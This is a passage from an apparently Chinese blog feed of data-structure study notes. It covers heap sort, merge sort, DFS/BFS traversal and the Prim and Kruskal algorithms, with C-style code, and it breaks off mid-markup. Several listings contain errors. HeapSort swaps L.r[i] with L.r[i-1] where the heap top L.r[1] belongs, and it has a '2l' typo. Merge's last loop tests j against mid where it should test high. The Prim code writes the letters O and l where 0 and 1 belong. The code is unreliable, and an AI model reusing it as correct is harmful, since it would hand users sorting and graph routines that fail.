mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><p>:three:时间复杂度：<strong>O(n^2^)</strong></p><p>:four:空间复杂度：<strong>O(1)</strong></p><p>:five:稳定性与具体实现有关</p></li></ul><h6 id="树形选择排序-deciduous-tree">树形选择排序:deciduous_tree:</h6><h6 id="堆排序：">堆排序：</h6><ul><li><p>定义：</p><ul><li><p>堆排序 (Heap Sort) 是一种树形选择排序，在排序过程中，将待排序的记录 r[l…n]看成是一棵完全二叉树的顺序存储结构，利用完全二叉树中双亲结点和孩子结点之间的内在关系，在当前无序的序列中选择关键字最大（或最小）的记录</p></li><li><p>若将和此序列对应的一维数组（ 即以一维数组做此序列的存储结构） 看成是一个完全二叉树， 则堆实质上是满足如下性质的完全二叉树：树中所有非终端结点的值均不大于（或不小于）其左、右孩子结点的值(根结点最大或最小)</p></li><li><p>n个元素的序列{k~1~,k~2~,…，k~n~}称之为堆， 当且仅当满足以下条件时：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>k</mi><mi>i</mi></msub><mo>≤</mo><msub><mi>k</mi><mrow><mn>2</mn><mi>i</mi></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>k</mi><mi>i</mi></msub><mo>≤</mo><msub><mi>k</mi><mrow><mn>2</mn><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr></mtable></mrow><mtext>或</mtext><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>k</mi><mi>i</mi></msub><mo>≥</mo><msub><mi>k</mi><mrow><mn>2</mn><mi>i</mi></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>k</mi><mi>i</mi></msub><mo>≥</mo><msub><mi>k</mi><mrow><mn>2</mn><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">\begin{cases}k_i\leq k_{2i}\\k_i\leq k_{2i+1}\end{cases}或\begin{cases}k_i\geq k_{2i}\\k_i\geq k_{2i+1}\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">或</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p></li></ul></li><li><p>分类：大顶堆/小顶堆；大根堆/小根堆</p></li><li><p>性质：</p><ul><li>堆是一棵采用<strong>顺序存储结构</strong>的<strong>完全二叉树</strong></li><li>堆的根结点是关键字序列中的最小(或最大)值，分别称为小(或大)根堆</li><li>从根结点到每一叶子结点路径上的元素组成的序列都是按元素值(或关键字值)非递减(或非递增)的</li><li>堆中的任一子树也是堆</li></ul></li><li><p>堆排序：</p><p>利用堆顶记录的关键字值最小(或最大)的性质，从 当前待排序的记录中依次选取关键字最小(或最大)的记录，就可以实现对数据记录的排序，这种排序方法称为堆排序</p></li><li><p>基本思想：</p><p>:one:将无序序列建成一个堆</p><p>:two:输出堆顶的最小（大）值</p><p>:three:使剩余的n-1个元素又调整成一个堆，则可得到 n个元素的次小值</p><p>:four:重复执行，得到一个有序序列</p><img src="/2024/02/19/%E6%8E%92%E5%BA%8F/124418.jpg" class=""></li><li><p>算法：</p><p>:one:堆调整算法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">HeapAdjust</span><span class="hljs-params">(SqList &amp;L, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> m)</span><br>&#123;<span class="hljs-comment">// r[n..m]中记录关键字除r[n].key之外均满足堆定义</span><br> <span class="hljs-comment">//本函数调整r[n]的位置使之成为一个大顶堆</span><br>rc = L.r[n];<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">2</span> * n; j &lt;= m; j *= <span class="hljs-number">2</span>) &#123;  <span class="hljs-comment">//沿key较大的孩子结点向下筛选</span><br><span class="hljs-keyword">if</span> (j &lt; m&amp;&amp;L.r[j].key &lt; L.r[j + <span class="hljs-number">1</span>].key)j++;  <span class="hljs-comment">// j为key较大记录的下标</span><br><span class="hljs-keyword">if</span> (rc.key &gt;= L.r[j].key)<span class="hljs-keyword">break</span>;  <span class="hljs-comment">// rc应插入在位置n上</span><br>L.r[n] = L.r[j];<br>n = j;<br>&#125;<br>L.r[n] = rc;<br>&#125;<br></code></pre></td></tr></table></figure><p>:two:堆排序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">HeapSort</span><span class="hljs-params">(SqList &amp;L)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br>n = L.length;<br><span class="hljs-keyword">for</span> (i = n / <span class="hljs-number">2l</span>i &gt; <span class="hljs-number">0</span>; i--)<br>HeapAdjust(L, i, n);  <span class="hljs-comment">//初始建堆</span><br><span class="hljs-keyword">for</span> (i = n; i &gt; <span class="hljs-number">1</span>; i--)  <span class="hljs-comment">//进行n-1趟排序</span><br>&#123;<br>Swap(L.r[i], L.r[i - <span class="hljs-number">1</span>]);  <span class="hljs-comment">//堆顶与最后一个记录交换</span><br>HeapAdjust(L, <span class="hljs-number">1</span>, i - <span class="hljs-number">1</span>);  <span class="hljs-comment">//将L.r[1..i-1]重新调整为堆</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>算法分析：</p><ul><li>时间效率：<strong>O(nlog~2~n)</strong></li><li>空间效率：<strong>O(1)</strong></li><li>稳定性：<strong>不稳定</strong></li><li>适用于n较大的情况</li><li>只能用顺序存储实现，不能用链式存储</li><li>堆排序的时间主要消耗在建初始堆和调整建立新堆时进行的反复“筛选”上。堆排序在最坏情况下，其时间复杂度也为O(nlog2n)，这是堆排序的最大优点。无论待排序列中的记录是正序还是逆序，都不会使堆排序处于“最好”或“ 最坏”的状态</li></ul></li></ul><h1>归并排序</h1><h4 id="定义">定义</h4><ul><li><p>归并：将两个或两个以上的有序表组合成一个新有序表</p></li><li><p>2-路归并排序：子序列总是两两归并</p><p>:one:初始序列看成n个有序子序列，每个子序列长度为1</p><p>:two:两两合并，得到 n/2 个长度为2或1的有序子序列</p><p>:three:再两两合并，重复直至得到一个长度为n的有序序列为止</p></li></ul><h4 id="算法：">算法：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Merge</span><span class="hljs-params">(RedType R[], RedType T[], <span class="hljs-type">int</span> low, <span class="hljs-type">int</span> mid, <span class="hljs-type">int</span> high)</span><br>&#123;<br>i = low;<br>j = mid + <span class="hljs-number">1</span>;<br>k = low;<br><span class="hljs-keyword">while</span> (i&lt;=mid&amp;&amp;j&lt;=high)<br>&#123;<br><span class="hljs-keyword">if</span> (R[i].key &lt;= R[j].key)T[k++] = R[i++];<br><span class="hljs-keyword">else</span> T[k++] = R[j++];<br>&#125;<br><span class="hljs-keyword">while</span> (i &lt;= mid)T[k++] = R[i++];<br><span class="hljs-keyword">while</span> (j &lt;= mid)T[k++] = R[j++];<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">MSort</span><span class="hljs-params">(RedType R[], RedType &amp;T[], <span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high)</span><br>&#123;<span class="hljs-comment">//R [low .. high]归并排序后放人 T[low.. high]中</span><br><span class="hljs-keyword">if</span> (low == high) T[low] = R[low];<br><span class="hljs-keyword">else</span><br>&#123;<br>mid = (low + high) / <span class="hljs-number">2</span>; <span class="hljs-comment">//将当前序列一分为二， 求出分裂点 mid</span><br>MSort(R, S, low, mid); <span class="hljs-comment">//对子序列 R[low.. mid]递归归并排序， 结果放入S[low .. mid]</span><br>MSort(R, S, mid + <span class="hljs-number">1</span>, high);<span class="hljs-comment">//对子序列 R[mid+l.. high]递归归并排序， 结果放人 S[mid+ 1. . high]</span><br>Merge(S, T, low, mid, high);<span class="hljs-comment">//将S[low .. mid]和S[mid+l. .high]归并到 T[low .. high]</span><br>&#125;<span class="hljs-comment">//else </span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">MergeSort</span><span class="hljs-params">(SqList &amp;L)</span><br>&#123;<span class="hljs-comment">//对顺序表 L 做归并排序</span><br>MSort(L.r, L.r, <span class="hljs-number">1</span>, L.length);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="算法分析：">算法分析：</h4><ul><li>时间效率：<strong>O(nlog~2~n)</strong></li><li>空间效率：<strong>O(n)</strong>&lt;·····需要一个与原始序列同样大小的辅助序列</li><li>稳定性：<strong>稳定</strong></li><li>可用于链式结构，且不要附加存储空间，但递归实现时仍需要开辟相应的递归工作栈。</li><li>整个归并排序仅需 log~2~n 趟</li><li>两个顺序表合并的时间复杂度为O(m+n)，m和n分别为顺序表表长</li></ul>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据结构-图（二）</title>
    <link href="/2024/02/19/%E5%9B%BE2/"/>
    <url>/2024/02/19/%E5%9B%BE2/</url>
    
    <content type="html"><![CDATA[<h3 id="图的遍历">图的遍历</h3><ul><li>遍历的定义：从已给的连通图中某一顶点出发，沿着一些边访遍图中所有的顶点，且使每个顶点仅被访问<strong>一次</strong>，就叫做图的遍历，它是图的基本运算。</li><li>找每个顶点的邻接点的过程</li><li>图中可能存在回路，且图的任一顶点都可能与其它顶点相通，在访问完某个顶点之后可能会沿着某些边又回到了曾经访问过的顶点。</li></ul><h3 id="深度优先（DFS-Depth-First-Dearch">深度优先（DFS  -  Depth_First Dearch)</h3><ul><li><p>步骤：:one: 访问起始点v</p><p>​            :two: 若v的第1个邻接点没访问过，深度遍历此邻接点</p></li></ul><p>​                    :three: 若当前邻接点已访问过，再找v的第2个邻接点重新遍历</p><p>（ 在访问图中某一起始顶点 v 后，由 v出发，访问它的任一邻接顶点 w1。 再从w1出发，访问与 w1邻接但还未被访问过的顶点w2。然后再从w2出发，进行类似的访问，…如此进行下去，直至到达所有的邻接顶点都被访问过的顶点u为止）</p><ul><li><p>在邻接矩阵中实现DFS</p><ul><li><p>用邻接矩阵来表示图，遍历图中每一个顶点都要从头扫描该顶点所在行，<strong>时间复杂度为O(n^2^ )</strong></p></li><li><p><strong>稠密图</strong>适于在邻接矩阵上进行深度遍历</p><img src="/2024/02/19/%E5%9B%BE2/163431.jpg" class=""></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">DFS</span><span class="hljs-params">(AMGraph G, <span class="hljs-type">int</span> v)</span>&#123; <span class="hljs-comment">//图G为邻接矩阵类型</span><br><span class="hljs-built_in">printf</span>(“%d”, v);  <span class="hljs-comment">//访问第v个顶点</span><br>    visited[v] = TRUE; <br><span class="hljs-keyword">for</span>(w = <span class="hljs-number">0</span>; w&lt; G.vexnum; w++) <span class="hljs-comment">//依次检查邻接矩阵v所在的行</span><br><span class="hljs-keyword">if</span>((G.arcs[v][w]!=<span class="hljs-number">0</span>) &amp;&amp; (!visited[w])) <br>DFS(G, w); <span class="hljs-comment">//w是v的邻接点，如果w未访问，则递归调用DFS </span><br>&#125; <br></code></pre></td></tr></table></figure></li><li><p>在邻接表中实现DFS</p><ul><li><p>邻接表来表示图，虽然有2e个表结点，但只需扫描e个结点即可完成遍历，加上访问 n个头结点的时间，<strong>时间复杂度为O(n+e)</strong>。</p></li><li><p><strong>稀疏图</strong>适于在邻接表上进行深度遍历。</p><img src="/2024/02/19/%E5%9B%BE2/170802.jpg" class=""></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">DFS</span><span class="hljs-params">(ALGraph G, <span class="hljs-type">int</span> v)</span>&#123; <span class="hljs-comment">//图G为邻接表类型</span><br><span class="hljs-built_in">printf</span>(“%d”, v); <span class="hljs-comment">//访问第v个顶点</span><br>visited[v] = <span class="hljs-literal">true</span>; <br>p= G.vertices[v].firstarc; <span class="hljs-comment">//p指向v的边链表的第一个边结点</span><br><span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span>)&#123; <span class="hljs-comment">//边结点非空</span><br>w=p-&gt;adjvex; <span class="hljs-comment">//表示w是v的邻接点</span><br><span class="hljs-keyword">if</span>(!visited[w]) DFS(G, w); <span class="hljs-comment">//如果w未访问，则递归调用DFS </span><br>p=p-&gt;nextarc; <span class="hljs-comment">//p指向下一个边结点</span><br>&#125; <br>&#125; <br></code></pre></td></tr></table></figure></li></ul><h3 id="广度优先-BFS-－-Breadth-First-Search">广度优先( BFS － Breadth_First Search)</h3><ul><li><p>步骤：</p><p>在访问了起始点v之后，依次访问v的邻接点</p><p>然后再依次访问这些顶点中未被访问过的邻接点</p><p>直到所有顶点都被访问过为止</p><p>（ 广度优先搜索是一种分层的搜索过程，每向前走一步可能访问一批顶点，不像深度优先搜索那样有回退的情况。 因此，广度优先搜索不是一个递归的过程，其算法也不是递归的）</p></li><li><p>算法：</p><p>从图中某个顶点v出发，访问v，并置visited[v]的值为true ，然后将v进队。</p><p>只要队列不空，则重复下述处理：</p><p>① 队头顶点u出队。</p><p>② 依次检查u的所有邻接点w，如果visited[w]的值为false， 则访问w，并置visited[w]的值为true，然后将w进队。</p></li><li><p>如果使用邻接矩阵，则BFS对于每一个被访问到的顶点，都要循环检测矩阵中的整整一 行 n 个元素，总的时间代价为<strong>O(n^2^ )</strong>。</p></li><li><p>用邻接表来表示图，虽然有 2e 个表结点，但只需扫描 e 个结点即可完成遍历，加上访问 n 个头结点的时间，<strong>时间复杂度为O(n+e)</strong>。</p><img src="/2024/02/19/%E5%9B%BE2/165224.jpg" class=""></li><li><p>v1入队，非空----&gt;v1出队，依次遍历v1的所有邻接点----&gt;v2、v3入队，非空----&gt;v2出队，依次遍历v2所有邻接点----&gt;v4、v5入队……</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">BFS</span> <span class="hljs-params">(Graph G, <span class="hljs-type">int</span> v)</span>&#123; <br><span class="hljs-comment">//按广度优先非递归遍历连通图G </span><br><span class="hljs-built_in">printf</span>(“%d”, v); visited[v] = <span class="hljs-literal">true</span>; <span class="hljs-comment">//访问第v个顶点</span><br>InitQueue(Q); <span class="hljs-comment">//辅助队列Q初始化，置空</span><br>EnQueue(Q, v); <span class="hljs-comment">//v进队</span><br>    <br><span class="hljs-keyword">while</span>(!QueueEmpty(Q))&#123; <span class="hljs-comment">//队列非空</span><br>DeQueue(Q, u); <span class="hljs-comment">//队头元素出队并置为u </span><br><span class="hljs-keyword">for</span>(w = FirstAdjVex(G, u); w&gt;=<span class="hljs-number">0</span>; w = NextAdjVex(G, u, w)) <br><span class="hljs-keyword">if</span>(!visited[w])&#123; <span class="hljs-comment">//w为u的尚未访问的邻接顶点</span><br><span class="hljs-built_in">printf</span>(“%d”, w); visited[w] = <span class="hljs-literal">true</span>;<br>EnQueue(Q, w); <span class="hljs-comment">//w进队</span><br>&#125;<span class="hljs-comment">//if </span><br> &#125;<span class="hljs-comment">//while</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="图的应用">图的应用</h3><img src="/2024/02/19/%E5%9B%BE2/210439.jpg" class=""><h4 id="最小生成树">最小生成树</h4><ul><li><p>使用不同的遍历图的方法，可以得到不同的生成树</p></li><li><p>从不同的顶点出发，也可能得到不同的生成树</p></li><li><p>按照生成树的定义，n 个顶点的连通网络的生成树有 n 个顶点、n-1 条边</p></li><li><p>在网的多个生成树中，寻找一个<strong>各边权值之和最小</strong>的生成树</p></li><li><p>准则：</p><ul><li>必须只使用该网中的边来构造最小生成树</li><li>必须使用且仅使用<strong>n-1</strong>条边来联结网络中的<strong>n</strong>个顶点</li><li>不能使用产生<strong>回路</strong>的边</li></ul></li><li><p>Prim（普里姆）算法：（由点到线）</p><ul><li><p><strong>归并顶点</strong>，适于<strong>稠密网</strong></p></li><li><p><strong>时间复杂度：O(n^2^)</strong></p></li><li><p>算法思想：</p><p>设连通网络 N = { V, E }，TE是N上最小生成树中边的集合</p><p>重复执行下述操作：在所有u∈U，v∈V-U 的边(u, v) ∈E 中选择权值最小的边 (u0, v0) 并入集合TE ，同时把v0并入到U中</p><p>直到所有顶点都加入到最小生成树顶点集合U中为止(U = V)</p><img src="/2024/02/19/%E5%9B%BE2/190701.jpg" class=""><p>将选择的结点和未选择的结点划分开，两部分之间的连线就是待选择的边，选择权值最小的边加入，直至剩下的部分为空，即两个部分合并为一个部分（一个放大，一个减小）</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//普里姆算法</span><br><span class="hljs-comment">//辅助数组的定义，用来记录从顶点集 u到v - u 的权值最小的边</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>VerTexType adjvex; <span class="hljs-comment">//最小边在U中的那个顶点</span><br>ArcType lowcost;<span class="hljs-comment">//最小边上的权值</span><br>&#125;closedge[MVNum];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">MiniSpanTree_Prim</span><span class="hljs-params">(AMGraph G, VerTexType u)</span><br>&#123;<span class="hljs-comment">//无向网G以邻接矩阵形式存储， 从顶点u出发构造G的最小生成树T, 输出T的各条边</span><br>k = LocateVex(G, u); <span class="hljs-comment">//k 为顶点 u 的下标</span><br><span class="hljs-keyword">for</span> (j = O; j &lt; G.vexnum; ++j) <span class="hljs-comment">//对v-u 的每一个顶点 Vj, 初始化 closedge[j]</span><br><span class="hljs-keyword">if</span> (j != k) closedge[j] = &#123; u,G.arcs[k][j] &#125;; <span class="hljs-comment">//&#123;adjvex, lowcost&#125; </span><br>closedge[k].lowcost = O; <span class="hljs-comment">//初始， U=&#123;u&#125;</span><br><span class="hljs-keyword">for</span> (i = l; i &lt; G.vexnum; ++i)<br>&#123;<br><span class="hljs-comment">//选择其余 n - 1 个顶点，生成 n - 1 条边(n = G.vexnum)</span><br>k = Min(closedge);<span class="hljs-comment">//求出 T 的下一个结点：第 K 个顶点， closedge[k]中存有当前最小边</span><br>uO = closedge[k].adjvex;<span class="hljs-comment">//u0为最小边的一个顶点，u0∈U</span><br>vO = G.vex[k];<span class="hljs-comment">//v0为最小边的另一个顶点，v0∈V-U</span><br><span class="hljs-built_in">cout</span> &lt;&lt; uO &lt;&lt; vO;<span class="hljs-comment">//输出当前最小边（u0，v0）</span><br>closedge[k].lowcost = O;<span class="hljs-comment">//第k个顶点并入U集</span><br><span class="hljs-keyword">for</span> (j = O; j &lt; G.vexnum; ++j)<br><span class="hljs-keyword">if</span> (G.arcs[k][j] &lt; closedge[j].lowcost) <span class="hljs-comment">//新顶点并入u 后重新选择最小边</span><br>closedge[j] = &#123; G.vex[k] ,G.arcs[k][j] &#125;;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>Kruskal（克鲁斯卡尔）算法：（由段到线、由散到聚）</p><ul><li>归并<strong>边</strong>，适于<strong>稀疏网</strong></li><li><strong>时间复杂度：O(elog~2~ e)</strong></li></ul><img src="/2024/02/19/%E5%9B%BE2/191501.jpg" class=""></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//克鲁斯卡尔算法👀</span><br><span class="hljs-comment">//辅助数组Edges 的定义</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>VerTexType Head;  <span class="hljs-comment">//边的始点</span><br>VerTexType Tail;  <span class="hljs-comment">//边的终点</span><br>ArcType lowcost;  <span class="hljs-comment">//边上权值</span><br>&#125; Edge[arcnum];<br><br><span class="hljs-comment">//辅助数组 Vexset 的定义</span><br><span class="hljs-type">int</span> Vexset[MVNum];<br><br><br><span 